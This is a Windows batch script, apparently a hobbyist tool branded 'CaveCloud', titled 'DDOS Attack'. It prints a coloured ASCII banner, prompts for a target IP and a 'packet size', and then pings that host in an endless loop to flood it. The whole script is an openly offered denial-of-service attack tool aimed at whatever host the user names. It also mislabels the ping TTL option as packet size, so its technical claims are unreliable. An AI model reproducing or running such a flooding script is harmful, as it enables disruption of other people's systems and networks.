@echo off
SETLOCAL EnableDelayedExpansion
chcp 1252 > Nul
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
set "DEL=%%a"
mode 67,16
title DDOS Attack
cls
)
title CaveCloud Code
echo.
call :ColorText B "  .o88b.  .d8b.  db    db d88888b  .o88b. db       .d88b.  db    db d8888b."
echo.
call :ColorText B " d8P  Y8 d8' `8b 88    88 88'     d8P  Y8 88      .8P  Y8. 88    88 88  `8D"
echo.
call :ColorText B " 8P      88ooo88 Y8    8P 88ooooo 8P      88      88    88 88    88 88   88"
echo.
call :ColorText B " 8b      88~~~88 `8b  d8' 88~~~~~ 8b      88      88    88 88    88 88   88"
echo.
call :ColorText B " Y8b  d8 88   88  `8bd8'  88.     Y8b  d8 88booo. `8b  d8' 88b  d88 88  .8D"
echo.
call :ColorText B "  `Y88P' YP   YP    YP    Y88888P  `Y88P' Y88888P  `Y88P'  ~Y8888P' Y8888D'"
echo.
echo.
goto Next
:Next
set /p m=ip Host: 
echo.
set /p n=Packet Size: 
echo.
:DDOS
echo [CaveDDOS] %m% (%n%)
ping %m% -i %n% -t >nul
goto DDOS
exit
:ColorText
echo off
<nul set /p ".=%DEL%" > "%~2"
findstr /v /a:%1 /R "^$" "%~2" nul
del "%~2" > nul 2>&1
goto :eof